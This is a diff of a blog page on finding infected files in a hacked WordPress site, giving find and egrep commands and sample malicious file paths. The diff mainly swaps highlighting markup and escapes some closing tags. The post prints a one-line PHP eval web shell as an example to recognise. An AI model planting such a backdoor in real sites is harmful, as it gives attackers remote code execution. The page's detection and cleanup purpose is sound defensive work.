@@ -14,6 +14,7 @@
   <meta name="description" content="The best thing to do is to clean your database, delete your site and re-install it.">
 
   <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="/css/prism.css">
   <link rel="canonical" href="http://tldrdevnotes.com/sysadmin/Finding-infected-files-wordpress.html">
   <link rel="alternate" type="application/rss+xml" title="TLDR Dev Notes" href="http://tldrdevnotes.com/feed.xml">
   <link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css'>
@@ -74,14 +75,14 @@
 
     <div class="page-content">
       <div class="wrapper">
-        <article class="Post" itemscope itemtype="http://schema.org/BlogPosting">
+        <article class="Post" itemscope="" itemtype="http://schema.org/BlogPosting">
 
   <header class="Post-header">
     <h1 class="Post-title" itemprop="name headline">Finding infected files in WordPress</h1>
     <p class="Post-meta">
       
       
-      <span class='ctime'>Created
+      <span class="ctime">Created
         <time datetime="2017-07-05T00:00:00+05:00" itemprop="datePublished">
           Jul 5, 2017
         </time>
@@ -91,53 +92,62 @@
       
 
       <!---->
-      <span style='float:right'><a href="https://github.com/aamnah/tldrdevnotes.com/blob/master/_sysadmin/Finding-infected-files-wordpress.md" target='_blank'>Edit this page on Github</a>
-    </p>
+      <span style="float:right"><a href="https://github.com/aamnah/tldrdevnotes.com/blob/master/_sysadmin/Finding-infected-files-wordpress.md" target="_blank">Edit this page on Github</a>
+    &lt;/p&gt;
     
-      <ul class='tags'>
+      <ul class="tags">
       
       </ul>
     
-  </header>
+  &lt;/header&gt;
 
   <div class="Post-content" itemprop="articleBody">
     <p>The best thing to do is to clean your database, delete your site and re-install it.</p>
 
 <ul>
-<li>Keep things updated</li>
-<li>Don&#39;t install themes from <em>warez</em> sites, duh. If you don&#39;t pay for it, you&#39;ll end up paying for it, only worse..</li>
-<li>Disable any files that you find suspicious. This can be done simply by add a <code>.OFF</code> at the end of the file name, after the extension. For example <code>favicon_de19d8.ico.OFF</code>. This will stop the execution of that particular file</li>
-<li>Find that breach! No use in cleaning up the site if the breach isn&#39;t fixed, the hacker will just breach again and re-inject the malicious code</li>
+  <li>Keep things updated</li>
+  <li>Don’t install themes from <em>warez</em> sites, duh. If you don’t pay for it, you’ll end up paying for it, only worse..</li>
+  <li>Disable any files that you find suspicious. This can be done simply by add a <code>.OFF</code> at the end of the file name, after the extension. For example <code>favicon_de19d8.ico.OFF</code>. This will stop the execution of that particular file</li>
+  <li>Find that breach! No use in cleaning up the site if the breach isn’t fixed, the hacker will just breach again and re-inject the malicious code</li>
 </ul>
 
-<h4>uploads</h4>
-
+<h4 id="uploads">uploads</h4>
 <p>The <code>uploads</code> directory is <em>writable</em>. Plus it usually has thousands of files, you rarely check them. It is a great place to hide malicious code..</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">find wp-content/uploads -name <span class="s2">"*.php"</span> -print
-</code></pre></div>
-<h4>.ico files</h4>
 
-<p>If you have files like these, chances are they are infected. </p>
-<div class="highlight"><pre><code class="language-" data-lang="">./wp-admin/network/favicon_de19d8.ico
+<pre><code class="language-bash">find wp-content/uploads -name "*.php" -print
+</code></pre>
+
+<h4 id="ico-files">.ico files</h4>
+
+<p>If you have files like these, chances are they are infected.</p>
+
+<pre><code>./wp-admin/network/favicon_de19d8.ico
 ./wp-content/wptouch-data/extensions/favicon_43e3fd.ico
-</code></pre></div>
-<p>If you open them in a text editor, you&#39;ll find code inside. Delete these files.</p>
+</code></pre>
 
-<h4>.eval()</h4>
+<p>If you open them in a text editor, you’ll find code inside. Delete these files.</p>
 
-<p>Code that looks like this is basically a backdoor that allows any kind of code to be executed. It&#39;s a <em>Code Inejction Attack</em></p>
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'@01'</span><span class="p">]);</span><span class="cp">?&gt;</span>
-</code></pre></div>
-<p>Any file that has the <code>.eval()</code> code is malicious. It <strong>let&#39;s the hacker run any kind of code, and add, update and delete any kind of data</strong>. <code>.eval()</code> is dangerous, insecure, and highly discouraged. Some plugins might still use it, you should not use those plugins.</p>
+<h4 id="eval">.eval()</h4>
+
+<p>Code that looks like this is basically a backdoor that allows any kind of code to be executed. It’s a <em>Code Inejction Attack</em></p>
+
+<pre><code class="language-php">&lt;?php @eval($_POST['@01']);?&gt;
+</code></pre>
+<p>Any file that has the <code>.eval()</code> code is malicious. It <strong>let’s the hacker run any kind of code, and add, update and delete any kind of data</strong>. <code>.eval()</code> is dangerous, insecure, and highly discouraged. Some plugins might still use it, you should not use those plugins.</p>
 
 <p>Find files having <code>eval()</code> code with</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">egrep -lri <span class="s1">'@eval'</span> .
-</code></pre></div><div class="highlight"><pre><code class="language-" data-lang="">./public_html/wp-content/themes/business-one-page/404.php
-</code></pre></div>
-<h4>files with weird, non-sensical names</h4>
+
+<pre><code class="language-bash">egrep -lri '@eval' .
+</code></pre>
+
+<pre><code>./public_html/wp-content/themes/business-one-page/404.php
+</code></pre>
+
+<h4 id="files-with-weird-non-sensical-names">files with weird, non-sensical names</h4>
 
 <p>For example:</p>
-<div class="highlight"><pre><code class="language-" data-lang="">./ceshi.html
+
+<pre><code>./ceshi.html
 ./ceshi.php
 ./d6c0cf.php
 ./db9d04.php
@@ -149,21 +159,24 @@
 ./wp-content/hk9eJ/lyty.php
 ./wp-content/wptouch-data/extensions/favicon_43e3fd.ico
 ./wp-content/plugins/js_composer/vendor/composer/css/c82987
-</code></pre></div>
-<h4>find all files on the server with the word &#39;xxx~hacker&#39; in them</h4>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">sudo egrep -irl <span class="s1">'xxx~hacker'</span> /
-</code></pre></div><div class="highlight"><pre><code class="language-" data-lang="">/var/cpanel/webtemplates/hostmark/english/suspended.tmpl
-/var/cpanel/webtemplates/hostmark/english/default.tmpl
-</code></pre></div>
-<h2>Links</h2>
+</code></pre>
 
-<ul>
-<li><a href="http://www.wpbeginner.com/wp-tutorials/how-to-find-a-backdoor-in-a-hacked-wordpress-site-and-fix-it/">How to Find a Backdoor in a Hacked WordPress Site and Fix It</a></li>
-</ul>
+<h4 id="find-all-files-on-the-server-with-the-word-xxxhacker-in-them">find all files on the server with the word ‘xxx~hacker’ in them</h4>
+
+<pre><code class="language-bash">sudo egrep -irl 'xxx~hacker' /
+</code></pre>
+
+<pre><code>/var/cpanel/webtemplates/hostmark/english/suspended.tmpl
+/var/cpanel/webtemplates/hostmark/english/default.tmpl
+</code></pre>
+<p>Links
+—
+- <a href="http://www.wpbeginner.com/wp-tutorials/how-to-find-a-backdoor-in-a-hacked-wordpress-site-and-fix-it/">How to Find a Backdoor in a Hacked WordPress Site and Fix It</a></p>
 
   </div>
 
-</article>
+&lt;/article&gt;
+</span></p></header></article>
 
       </div>
     </div>
@@ -209,6 +222,7 @@
   </div>
 
 </footer>
+<script src="/js/prism.js"></script>
 
     <script>
   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
